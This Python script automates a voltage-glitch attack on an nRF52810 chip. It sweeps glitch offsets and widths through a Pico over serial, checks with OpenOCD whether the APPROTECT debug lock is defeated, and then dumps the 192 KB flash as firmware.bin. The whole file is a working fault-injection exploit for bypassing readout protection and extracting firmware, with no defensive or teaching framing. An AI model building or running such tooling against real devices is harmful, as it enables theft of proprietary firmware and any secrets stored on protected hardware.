"""
Voltage glitch sweep for nRF52810 APPROTECT bypass.

Requirements:
    pip install pyserial

Usage:
    python glitch_sweep.py --port COM3 --openocd "C:/path/to/openocd.exe"
    python glitch_sweep.py --port COM3 --dump   # after finding working params
"""

import argparse
import subprocess
import sys
import time

import serial


OPENOCD_CMDS_CHECK = "init; halt; exit"
OPENOCD_CMDS_DUMP  = "init; halt; dump_image firmware.bin 0x00000000 196608; exit"
NRF52_FLASH_SIZE   = 192 * 1024  # 192 KB


def openocd_run(openocd: str, cmds: str, timeout: int = 5) -> bool:
    try:
        r = subprocess.run(
            [openocd,
             "-f", "interface/cmsis-dap.cfg",
             "-f", "target/nrf52.cfg",
             "-c", cmds],
            capture_output=True, text=True, timeout=timeout,
        )
        out = r.stdout + r.stderr
        failed = ("Error" in out or "timed out" in out or
                  "APPROTECT" in out or r.returncode != 0)
        return not failed
    except subprocess.TimeoutExpired:
        return False
    except FileNotFoundError:
        print(f"ERROR: openocd not found at '{openocd}'")
        sys.exit(1)


def send(ser: serial.Serial, cmd: str) -> str:
    ser.write((cmd + "\n").encode())
    return ser.readline().decode().strip()


def sweep(ser: serial.Serial, openocd: str,
          offset_range: range, width_range: range) -> tuple[int, int] | None:

    total = len(offset_range) * len(width_range)
    done  = 0

    for offset in offset_range:
        for width in width_range:
            done += 1
            print(f"\r[{done}/{total}] offset={offset:3d}µs  width={width:3d}µs   ", end="", flush=True)

            resp = send(ser, f"G {offset} {width}")
            if resp != "OK":
                print(f"\nPico error: {resp}")
                continue

            time.sleep(0.05)

            if openocd_run(openocd, OPENOCD_CMDS_CHECK):
                print(f"\n\n*** SUCCESS  offset={offset}µs  width={width}µs ***\n")
                return offset, width

    print("\nSweep finished — no unlock found.")
    return None


def dump(openocd: str) -> None:
    print("Dumping firmware.bin ...")
    if openocd_run(openocd, OPENOCD_CMDS_DUMP, timeout=30):
        print("firmware.bin written (192 KB)")
    else:
        print("Dump failed — SWD may have locked again, try immediately after glitch")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port",    required=True,  help="Pico serial port, e.g. COM3 or /dev/ttyACM0")
    ap.add_argument("--openocd", default="openocd", help="Path to openocd executable")
    ap.add_argument("--dump",    action="store_true", help="Skip sweep, just try to dump (use if already unlocked)")
    ap.add_argument("--offset-min",  type=int, default=1)
    ap.add_argument("--offset-max",  type=int, default=60)
    ap.add_argument("--offset-step", type=int, default=1)
    ap.add_argument("--width-min",   type=int, default=1)
    ap.add_argument("--width-max",   type=int, default=30)
    ap.add_argument("--width-step",  type=int, default=1)
    args = ap.parse_args()

    if args.dump:
        dump(args.openocd)
        return

    print(f"Connecting to Pico on {args.port}...")
    ser = serial.Serial(args.port, 115200, timeout=2)
    time.sleep(2)
    ser.reset_input_buffer()

    offset_range = range(args.offset_min, args.offset_max + 1, args.offset_step)
    width_range  = range(args.width_min,  args.width_max  + 1, args.width_step)

    print(f"Sweeping {len(offset_range)} offsets × {len(width_range)} widths "
          f"= {len(offset_range)*len(width_range)} attempts\n")

    result = sweep(ser, args.openocd, offset_range, width_range)
    ser.close()

    if result:
        offset, width = result
        print(f"Working params: --offset-min {offset} --offset-max {offset} "
              f"--width-min {width} --width-max {width}")
        print("Now run with --dump to grab the firmware while SWD is open.")


if __name__ == "__main__":
    main()
